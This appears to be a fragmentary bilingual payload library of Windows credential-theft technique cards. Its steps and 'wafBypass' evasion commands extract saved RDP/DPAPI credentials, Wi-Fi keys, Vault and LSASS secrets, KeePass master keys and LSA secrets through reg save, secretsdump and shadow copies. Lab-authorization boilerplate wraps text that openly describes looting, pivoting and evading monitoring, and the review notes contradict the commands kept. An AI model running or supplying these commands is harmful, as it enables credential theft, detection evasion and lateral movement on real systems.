description.en: Evades per-user interaction (one mimikatz alert each) by exporting the domain DPAPI backup key then bulk-decrypting any user blob offline. Success: the backup key decrypts the target credential files.

description.zh: 绕过逐 blob 解密的重复操作特征：读取已缓存的 masterkey 表一次成型。成功判据：缓存表直接用于解密。
description.en: Evades repeated per-blob decryption signatures by reading the cached masterkey table in one shot. Success: the cache table decrypts directly.

name.zh: RDP 配置与凭据引用审计

description.zh: RDP 配置与凭据引用审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: RDP Configuration and Credential-Reference Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 RDP 配置与凭据引用审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for RDP Configuration and Credential-Reference Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 RDP 配置与凭据引用审计场景，检验本地保存的远程桌面连接文件与系统凭据库的泄露面。验证维度含 RDP 文件检索、cmdkey 清单与 DPAPI 凭据解密三步，对应第 1 至第 3 步。
overview.en: This payload covers RDP configuration and credential-reference auditing, testing exposure from locally saved remote-desktop files and the system credential store. Validation covers RDP file discovery, a cmdkey inventory and DPAPI credential decryption, mapped to steps 1 through 3.

vulnerability.zh: 根因在于用户目录的 RDP 文件常含主机、用户名乃至口令引用，系统凭据库又以 DPAPI 保护可被同上下文提取：一次本机沦陷即可横向批量复用远程凭据。
vulnerability.en: The root cause is RDP files in user profiles holding hosts, usernames and sometimes password references, while the credential store is DPAPI-protected but extractable in the same context: one host compromise enables broad lateral reuse of remote credentials.

exploitation.zh: 第 1 步递归检索用户文档目录的 .rdp 文件并审查其中的凭据引用；第 2 步用 cmdkey 的 list 模式列出系统保存凭据，输出目标与用户名条目即确认存储面；第 3 步用 mimikatz dpapi::cred 解密本地 Credentials 目录中 RDP 相关 blob，还原口令即确认泄露链完整。以还原出的凭据为成功判据。占位符在全局变量菜单替换。
exploitation.en: In step 1, recursively find .rdp files under user document directories and review credential references inside. In step 2, list saved system credentials with cmdkey's list mode; target and username entries confirm the stored surface. In step 3, decrypt RDP-related blobs in the local Credentials directory with mimikatz dpapi::cred; recovered passwords complete the leak chain. Judge success by recovered credentials. Replace placeholders via the global variables menu.

mitigation.zh: 禁用 RDP 客户端凭据保存策略，清理存量 .rdp 引用并轮换暴露的远程口令，凭据库访问纳入监控。修复后重放第 2、3 步，清单应为空且解密无产出。
mitigation.en: Disable RDP client credential-saving policy, purge legacy .rdp references, rotate exposed remote passwords, and monitor credential-store access. After the fix, replay steps 2 and 3: the inventory should be empty with no decryption output.

description.zh: 递归搜索用户文档目录中的 .rdp 连接文件；输出文件清单即掌握历史连接的目标主机地址与登录配置，圈定横向移动的目的地。
description.en: Recursively search the user profile for .rdp files; the file list reveals previously targeted hosts and their logon settings for lateral movement.

description.zh: 用 cmdkey 的 list 模式列出保存的凭据；输出 TERMSRV 开头的条目即确认存在与 RDP 目标绑定的存储凭据，可进一步解密提取。
description.en: List saved credentials with cmdkey /list; TERMSRV entries prove stored RDP credentials exist and are worth decrypting.

description.zh: 用 mimikatz 的 dpapi::cred 解密本地 Credentials 目录中的 blob；还原出明文口令后即可直接登录历史 RDP 目标，完成横向移动。
description.en: Decrypt the local Credentials blob with mimikatz dpapi::cred; the recovered plaintext authenticates directly to the previously used RDP targets.

analysis.zh: RDP 配置与凭据引用审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: RDP Configuration and Credential-Reference Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 在合成配置目录检查 RDP 文件与凭据引用，不枚举系统凭据管理器内容或解密 DPAPI。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: RDP 文件离线解析规避变体

description.zh: 绕过 mstsc 交互审计：仅收集 .rdp 中 DPAPI blob 后离线解密。成功判据：blobs.txt 含 51:b 密文并可解。
description.en: Evades mstsc interactive auditing by collecting only the DPAPI blobs from .rdp files for offline decryption. Success: blobs.txt contains 51:b ciphertext that decrypts.

title.zh: cmdkey 静默枚举规避变体

description.zh: 绕过全量 cmdkey 输出的噪声审计：过滤仅保留目标终端服务器条目。成功判据：列出目标主机的保存凭据别名。
description.en: Evades noisy full cmdkey output auditing by filtering to target terminal-server entries only. Success: saved credential aliases for the target host are listed.

title.zh: 凭据目录批量离线规避变体

wafBypass.command: Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -Force | Copy-Item -Destination C:\Windows\Temp\rdpc\ -Force; SharpDPAPI.exe blobs /target C:\Windows\Temp\rdpc

description.zh: 绕过逐文件交互解密：整目录复制后统一离线解 blob。成功判据：批量解出 RDP 明文口令。
description.en: Evades per-file interactive decryption by copying the whole directory then decrypting blobs in bulk offline. Success: RDP plaintext passwords come out in batch.

name.zh: Wi-Fi 配置元数据审计

description.zh: Wi-Fi 配置元数据审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Wi-Fi Profile Metadata Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 Wi-Fi 配置元数据审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Wi-Fi Profile Metadata Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 Wi-Fi 配置元数据审计场景，检验本机 WLAN 配置文件口令的可提取性。验证维度含配置文件枚举与明文密钥显示两步，对应第 1 至第 2 步。
overview.en: This payload covers Wi-Fi configuration metadata auditing, testing extractability of WLAN profile passphrases on the host. Validation covers profile enumeration and plaintext key display, mapped to steps 1 and 2.

vulnerability.zh: 根因在于系统接口允许任意本机用户以 key=clear 读回已保存的无线口令：终端一旦失陷，企业无线口令即暴露，攻击者可就近接入内部网络。
vulnerability.en: The root cause is the system interface letting any local user read saved wireless passphrases with key=clear: once a host falls, corporate wireless passphrases surface and attackers can join the internal network on-site.

exploitation.zh: 第 1 步用 netsh wlan show profiles 列出接口下全部配置文件名；第 2 步对目标配置文件以 key=clear 显示，输出安全密钥明文即确认口令可本机提取，记录 SSID、认证类型与加密方式留证。以明文密钥为成功判据。占位符在全局变量菜单替换；提取范围仅限授权终端。
exploitation.en: In step 1, list all profile names under the interface with netsh wlan show profiles. In step 2, show the target profile with key=clear; a plaintext security key confirms local extraction, and record SSID, authentication and cipher for evidence. Judge success by the plaintext key. Replace placeholders via the global variables menu; limit extraction to authorized endpoints.

mitigation.zh: 企业网络改用 802.1X 证书认证替代共享 PSK，定期轮换无法避免的 PSK 并限制本机配置文件读取。修复后重放第 2 步，共享口令应不存在或已轮换失效。
mitigation.en: Move enterprise networks to 802.1X certificate authentication instead of shared PSKs, rotate any unavoidable PSKs regularly, and restrict local profile reads. After the fix, replay step 2: shared passphrases should be absent or rotated invalid.

title.zh: 枚举 WLAN 配置文件

description.zh: 用 netsh wlan 的 show profiles 列出接口下全部配置文件；输出 SSID 清单即锁定可提取口令的无线网络目标，优先企业内网热点。
description.en: List every profile with netsh wlan show profiles; the SSID list marks which wireless networks have extractable keys, corporate SSIDs first.

description.zh: 对目标 SSID 以 key=clear 参数显示完整配置；输出关键内容字段中的明文安全密钥即可复制到其他设备，直接接入目标内网无线网络。
description.en: Show the target SSID with key=clear; the plaintext security key in the output can be copied to another device for direct internal network access.

title.zh: 复用密钥接入内网横向
title.en: Reuse the key to pivot into the network

description.zh: 把提取的密钥配置到攻击设备接入目标无线网络；接入后扫描内网网段定位存活主机与服务，将无线入口转化为内网横向移动的立足点。
description.en: Configure the extracted key on the attacker device to join the network; scanning the internal subnet from there turns wireless access into a pivot point.

analysis.zh: Wi-Fi 配置元数据审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Wi-Fi Profile Metadata Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只列出实验无线配置名称与认证类型，不使用 key=clear 或记录预共享密钥。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

wafBypass.command: netsh wlan export profile folder=C:\Windows\Temp\ key=clear

description.zh: 绕过逐 profile 交互查询的重复特征：一次性导出全部含明文密钥的 XML。成功判据：导出文件含 keyMaterial 明文。
description.en: Evades repeated per-profile query signatures by exporting all profiles with clear keys to XML in one shot. Success: exported files contain plaintext keyMaterial.

title.zh: 单 profile 定向规避变体

wafBypass.command: netsh wlan show profile name="{LAB_SSID}" key=clear | findstr /i "关键内容 key content"

description.zh: 绕过全量枚举的审计关注：仅定向提取目标 SSID 密钥。成功判据：输出目标网络明文密钥。
description.en: Evades audit focus on bulk enumeration by extracting only the target SSID key. Success: the target network's plaintext key is output.

wafBypass.command: powershell -nop -c "[xml]$x=(netsh wlan show profile name='{LAB_SSID}' key=clear | Select-String 'Key Content'); $x"

description.zh: 绕过 netsh 输出通道监控：脚本内调 NativeWifi/解析重组，无临时文件。成功判据：脚本内取得密钥且无落盘。
description.en: Evades netsh output-channel monitoring by parsing inside the script via NativeWifi with no temp files. Success: the key is obtained in-memory with nothing written to disk.

name.zh: Windows Vault 类型与访问审计
name.en: Windows Vault Type and Access Audit

description.zh: Windows Vault 类型与访问审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Windows Vault Type and Access Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

subCategory.zh: 本机注册表与保护存储

prerequisites.zh: 确认 Windows Vault 类型与访问审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Windows Vault Type and Access Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 Windows Vault 类型与访问审计场景，检验凭据管理器家族与内存凭据的可枚举提取面。验证维度含 Vault 家族枚举、条目清单与内存提取三步，对应第 1 至第 3 步。
overview.en: This payload covers Windows Vault type and access auditing, testing enumeration and extraction across credential-manager families and in-memory credentials. Validation covers vault-family enumeration, entry listing and memory extraction, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 Vault 条目以用户上下文 DPAPI 保护且 LSASS 内存保留凭据管理器密钥：同上下文攻击者枚举条目后即可解密提取，浏览器与应用保存的口令随之暴露。
vulnerability.en: The root cause is Vault entries protected by user-context DPAPI while LSASS memory retains credential-manager keys: an in-context attacker enumerates entries then decrypts them, exposing browser and application saved passwords.

exploitation.zh: 第 1 步用 vaultcmd 的 list 模式列出全部 Vault 家族即枚举完成；第 2 步以 listcreds 展开 Windows Credentials 条目，输出凭据资源与身份即确认可提取项；第 3 步用 mimikatz 的 sekurlsa::credman 从内存提取凭据管理器密钥，输出用户名与口令即确认完整泄露链。以提取的凭据对为成功判据。占位符在全局变量菜单替换。
exploitation.en: In step 1, list all vault families with vaultcmd's list mode. In step 2, expand Windows Credentials entries with listcreds; credential resources and identities confirm extractable items. In step 3, pull credential-manager keys from memory with mimikatz sekurlsa::credman; username and password output completes the leak chain. Judge success by extracted credential pairs. Replace placeholders via the global variables menu.

mitigation.zh: 清理终端存量保存凭据并禁用浏览器口令保存，启用 LSA 保护与 LSASS 访问审计。修复后重放第 2、3 步，条目清单应为空且内存提取被 PPL 阻断。
mitigation.en: Purge saved credentials from endpoints, disable browser password saving, and enable LSA protection with LSASS access auditing. After the fix, replay steps 2 and 3: the entry list should be empty and memory extraction blocked by PPL.

description.zh: 用 vaultcmd 的 list 模式列出本机全部 Vault；输出 Windows Credentials 等容器名即确认凭据存储结构，圈定后续窃取范围。
description.en: List all Vaults with vaultcmd /list; container names like Windows Credentials map out the credential stores to loot.

title.zh: 列出 Vault 凭据条目

description.zh: 用 vaultcmd 的 listcreds 模式列出 Windows Credentials 全部条目；输出资源与身份信息即定位高价值窃取目标，如域账号与常用站点。
description.en: Dump Windows Credentials entries with vaultcmd /listcreds; resource and identity lines pinpoint high-value targets such as domain accounts.

description.zh: 用 mimikatz 的 sekurlsa::credman 从 LSASS 提取凭据管理器缓存；输出用户名与明文口令即绕过 Vault 自身加密完成凭据收割。
description.en: Extract the credential-manager cache from LSASS with sekurlsa::credman; usernames with plaintext flow out, skipping Vault's own encryption entirely.

analysis.zh: Windows Vault 类型与访问审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Windows Vault Type and Access Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只检查 Vault 类型、策略和访问事件，不列出凭据值或调用凭据导出功能。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: LSA 内存侧取规避变体

description.zh: 绕过 vaultcmd 落地日志与 Vault API 调用审计：token::elevate 后从 LSASS 内存导出凭据管理器条目。成功判据：输出含保存的明文凭据。
description.en: Evades vaultcmd logging and Vault API auditing by reading Credential Manager entries straight from LSASS memory. Success: output contains saved plaintext credentials.

title.zh: SharpVault API 调用规避变体

description.zh: 绕过 mimikatz 进程名特征：C# 直接调 VaultEnumerateVaults/VaultEnumerateItems。成功判据：返回 Vault 条目清单。
description.en: Evades the mimikatz process-name signature by calling VaultEnumerateVaults/VaultEnumerateItems directly from C#. Success: the vault entry list returns.

title.zh: vaultcmd 参数变形规避变体

wafBypass.command: vaultcmd /listcreds:"Windows 凭据" /all 2>nul & vaultcmd /listcreds:"Web 凭据" /all

description.zh: 绕过英文名称匹配的审计规则：以本地化 Vault 名变形查询。成功判据：两类凭据条目均返回。
description.en: Evades audit rules matching English names by querying with localized vault names. Success: both credential classes return entries.

name.zh: KeePass 文件与进程保护审计
name.en: KeePass File and Process Protection Audit

description.zh: KeePass 文件与进程保护审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: KeePass File and Process Protection Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 KeePass 文件与进程保护审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for KeePass File and Process Protection Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 KeePass 文件与进程保护审计场景，检验口令库文件的定位难度与运行中主密钥的内存可提取性。验证维度含全盘定位、配置目录检索与 KeeThief 内存提取三步，对应第 1 至第 3 步。
overview.en: This payload covers KeePass file and process protection auditing, testing how easily password-database files are located and running master keys are extracted from memory. Validation covers full-disk discovery, profile-directory search and KeeThief memory extraction, mapped to steps 1 through 3.

vulnerability.zh: 根因在于主密钥在解锁期间驻留进程内存且数据库文件散落用户目录：攻击者定位 .kdbx 后配合内存读取即可还原主密钥与全部条目，绕过口令强度限制。
vulnerability.en: The root cause is master keys resident in process memory while unlocked and database files scattered across user directories: after locating a .kdbx, an attacker pairs it with memory reads to recover the master key and all entries, bypassing password strength entirely.

exploitation.zh: 第 1 步全盘搜索 .kdbx 文件输出路径清单即定位完成；第 2 步在用户配置目录按深度限制递归检索并列出大小与修改时间；第 3 步加载 KeeThief 后从运行中的 KeePass 进程提取主密钥与数据库口令，输出即确认内存保护缺失。以主密钥或主口令还原为成功判据。占位符在全局变量菜单替换；仅在授权主机执行。
exploitation.en: In step 1, search the disk for .kdbx files and print the path list. In step 2, recursively search user profile directories with a depth limit, listing sizes and modification times. In step 3, load KeeThief and extract the master key and database passphrase from the running KeePass process; output confirms missing memory protection. Judge success by a recovered master key or passphrase. Replace placeholders via the global variables menu; execute only on authorized hosts.

mitigation.zh: 升级 KeePass 至启用内存防护的版本并锁定工作区后关闭进程，数据库文件集中存储并限制目录枚举。修复后重放第 3 步，内存提取应失败或返回空。
mitigation.en: Upgrade KeePass to builds with memory protection, lock workspaces and close processes when idle, centralize database storage, and restrict directory enumeration. After the fix, replay step 3: memory extraction should fail or return nothing.

description.zh: 递归搜索 C 盘下所有 .kdbx 数据库文件；输出路径清单即锁定口令库的落盘位置，同时记录大小与时间用于判断活跃程度。
description.en: Recursively hunt *.kdbx across C:; the path list locates password vaults, with size and timestamps hinting at which are actively used.

description.zh: 在用户配置目录按深度与数量约束搜索 .kdbx；列出文件大小与修改时间即可筛出近期活跃使用的口令库，作为优先攻击目标。
description.en: Bound the search under profile directories by depth and count; the most recently written kdbx is the actively used vault to prioritize.

title.zh: 从进程内存提取主密钥
title.en: Extract the master key from process memory

description.zh: 加载 KeeThief 注入 KeePass 进程提取主密钥与解锁口令；拿到密钥即可离线打开第 2 步定位的数据库，导出其中保存的全部凭据。
description.en: Load KeeThief and pull the master key from the running KeePass process; with the key in hand, open the vault from step 2 offline and export every secret.

analysis.zh: KeePass 文件与进程保护审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: KeePass File and Process Protection Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 在固定实验目录检查 KDBX 权限、应用版本与进程保护，不扫描全盘或提取主密码。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: KeeThief 内存提取规避变体

description.zh: 绕过 .kdbx 文件读取监控：从运行中的 KeePass 进程内存提取主密钥组件。成功判据：输出可用主密钥。
description.en: Evades .kdbx file-read monitoring by extracting master-key components from the running KeePass process memory. Success: a usable master key is output.

title.zh: 离线 hashcat 规避变体

wafBypass.command: keepass2john {LAB_KDBX_FILE} > kp.hash && hashcat -m 13400 kp.hash wordlist.txt -r rules/best64.rule

description.zh: 绕过目标侧持续操作：仅复制数据库文件后完全离线破解。成功判据：hashcat 恢复主口令。
description.en: Evades sustained on-target activity by copying the database once and cracking fully offline. Success: hashcat recovers the master password.

title.zh: 触发器持久导出规避变体

description.zh: 绕过即时内存提取的窗口限制：写入 KeePass 触发器在用户操作时自动导出。成功判据：触发后导出文件生成。
description.en: Evades the extraction time window by planting a KeePass trigger that exports on user activity. Success: the export file appears after triggering.

name.zh: LSA Secrets 存储边界审计

description.zh: LSA Secrets 存储边界审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: LSA Secrets Storage-Boundary Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

subCategory.zh: 域凭据与 LSA 提取

prerequisites.zh: 确认 LSA Secrets 存储边界审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for LSA Secrets Storage-Boundary Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 LSA Secrets 存储边界审计场景，检验服务账号密文与自动登录凭据的可提取路径。验证维度含 Mimikatz 直读、配置单元导出与离线解析三步，对应第 1 至第 3 步。
overview.en: This payload covers LSA Secrets storage-boundary auditing, testing extraction paths for service-account secrets and autologon credentials. Validation covers direct Mimikatz reads, hive export and offline parsing, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 LSA Secrets 以可被高权限进程还原的方式加密存储：服务账户口令、自动登录凭据与缓存密钥均可经注册表导出加离线解密取得明文。
vulnerability.en: The root cause is LSA Secrets stored encrypted but recoverable by high-privilege processes: service-account passwords, autologon credentials and cached keys all yield plaintext through registry export plus offline decryption.

exploitation.zh: 第 1 步用 mimikatz 的 lsadump::secrets 直读，输出服务账号明文或哈希即提取成功；第 2 步用 reg save 同时导出 SECURITY 与 SYSTEM 配置单元；第 3 步以 secretsdump.py 的 LOCAL 模式离线解析两份 hive，还原密钥明文即确认第二条路径同样可达。以任一路径明文产出为成功判据。占位符在全局变量菜单替换；导出文件测试后销毁。
exploitation.en: In step 1, read directly with mimikatz lsadump::secrets; service-account plaintext or hashes mark extraction success. In step 2, export the SECURITY and SYSTEM hives together with reg save. In step 3, parse both hives offline with secretsdump.py LOCAL mode; recovered plaintext proves the second path is equally reachable. Judge success by plaintext output from either path. Replace placeholders via the global variables menu; destroy exported files after testing.

mitigation.zh: 服务账号改用 gMSA，禁用自动登录并清理遗留 LSA 密文，监控 reg save 对 SECURITY 键的访问。修复后重放第 1、2 步，读取应被阻断并产生告警。
mitigation.en: Move service accounts to gMSA, disable autologon, purge legacy LSA secrets, and monitor reg save access to the SECURITY key. After the fix, replay steps 1 and 2: reads should be blocked with alerts.

description.zh: 用 mimikatz 的 lsadump::secrets 直接读取 LSA 保护数据；输出服务账号口令与自动登录凭据即拿到本机保存的高价值秘密，可直接复用。
description.en: Read LSA-protected data directly with lsadump::secrets; service passwords and autologon credentials come out in plaintext ready for reuse.

title.zh: 导出注册表 hive 备用

description.zh: 用 reg save 导出 SECURITY 与 SYSTEM 两个配置单元；文件落盘即备好离线解析材料，适合规避内存扫描或需要转移数据的场景。
description.en: Save the SECURITY and SYSTEM hives with reg save; offline copies suit environments where memory scanning is a concern or data must be exfiltrated.

description.zh: 用 secretsdump.py 以 security 与 system 参数离线解析导出的 hive；输出 DPAPI 域备份密钥与服务明文口令即完成 LSA 凭据收割闭环。
description.en: Parse the exported hives with secretsdump.py -security -system LOCAL; DPAPI domain backup keys and plaintext service passwords close out the harvest.

analysis.zh: LSA Secrets 存储边界审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: LSA Secrets Storage-Boundary Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对 SECURITY/SYSTEM hive ACL、备份权限和访问日志，不保存 hive 或导出秘密。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 离线 hive 解析规避变体

wafBypass.command: reg save HKLM\SECURITY sec.hive && reg save HKLM\SYSTEM sys.hive && secretsdump.py -security sec.hive -system sys.hive LOCAL

description.zh: 绕过目标内存操作检测（mimikatz 进程特征）：reg 导出后离线解析，目标侧仅两个导出动作。成功判据：离线输出 LSA secrets。
description.en: Evades in-memory operation detection (mimikatz process signatures) by exporting hives and parsing offline, leaving only two export actions on the target. Success: LSA secrets come out offline.

title.zh: DPAPI_SYSTEM 分离提取规避变体

wafBypass.command: reg save HKLM\SECURITY sec2.hive && secretsdump.py -security sec2.hive -system sys.hive LOCAL | Select-String 'DPAPI_SYSTEM|DefaultPassword|MACHINE.ACC'

description.zh: 绕过全量 secrets 输出的 DLP 特征：过滤仅保留机器账号与 DPAPI 键。成功判据：输出仅含目标键值。
description.en: Evades DLP signatures on full secrets output by filtering to machine account and DPAPI keys only. Success: output contains only the targeted values.

title.zh: 卷影只读提取规避变体

wafBypass.command: vssadmin create shadow /for=C: 2>nul & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy9\Windows\System32\config\SECURITY C:\Windows\Temp\s.hive & secretsdump.py -security s.hive -system sys.hive LOCAL

description.zh: 绕过注册表实时监控对 SECURITY 键访问的告警：经卷影副本只读提取。成功判据：s.hive 解析出 LSA secrets。
description.en: Evades live registry monitoring of SECURITY key access by extracting read-only through a shadow copy. Success: s.hive parses into LSA secrets.

name.zh: PsExec/SMB 远程服务边界验证
name.en: PsExec and SMB Remote-Service Boundary Validation

description.zh: PsExec/SMB 远程服务边界验证保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: PsExec and SMB Remote-Service Boundary Validation preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

